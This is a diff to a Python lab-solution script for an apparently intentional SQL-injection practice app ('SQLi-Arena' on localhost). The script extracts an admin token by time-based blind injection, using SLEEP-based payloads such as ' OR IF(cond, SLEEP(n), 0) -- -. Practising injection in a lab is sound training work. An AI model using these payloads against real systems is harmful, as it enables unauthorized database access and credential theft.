@@ -6,30 +6,29 @@ Extracts the admin token using response timing as the oracle.
 No visible output difference -- only response delay indicates TRUE.
 
 Usage:
-    python3 lab11_blind_time.py [TARGET_URL]
+    python3 lab11_blind_time.py [BASE_URL]
 
-Default target: http://localhost/SQLi-Arena/public/lab.php
+Default target: http://localhost/SQLi-Arena
 """
 import requests
 import sys
 import time
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
-PARAMS_BASE = {"lab": "mysql/lab11", "mode": "black"}
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost/SQLi-Arena"
+TARGET = f"{BASE}/mysql/lab11"
 
 SLEEP_SEC = 1       # seconds to sleep on TRUE (multiplied by matching rows)
 THRESHOLD = 2.0     # if response takes longer than this, it's TRUE
-RETRIES = 2         # Note: SLEEP fires per-row. With 5 session rows, SLEEP(1) → ~5s delay.         # retry on ambiguous timing
+RETRIES = 2         # Note: SLEEP fires per-row. With 5 session rows, SLEEP(1) → ~5s delay.
 
 
 def timed_check(condition):
     """Inject a condition inside IF(cond, SLEEP(n), 0). Return True if delayed."""
     payload = f"' OR IF({condition}, SLEEP({SLEEP_SEC}), 0) -- -"
-    params = {**PARAMS_BASE, "token": payload}
 
     for attempt in range(RETRIES):
         start = time.time()
-        requests.get(TARGET, params=params)
+        requests.post(TARGET, data={"token": payload})
         elapsed = time.time() - start
         if elapsed > THRESHOLD:
             return True
@@ -70,7 +69,7 @@ print(f"[*] SLEEP duration: {SLEEP_SEC}s | Threshold: {THRESHOLD}s")
 print("[*] Confirming time-based oracle...")
 
 start = time.time()
-requests.get(TARGET, params={**PARAMS_BASE, "token": f"' OR SLEEP({SLEEP_SEC}) -- -"})
+requests.post(TARGET, data={"token": f"' OR SLEEP({SLEEP_SEC}) -- -"})
 elapsed = time.time() - start
 
 if elapsed < THRESHOLD:
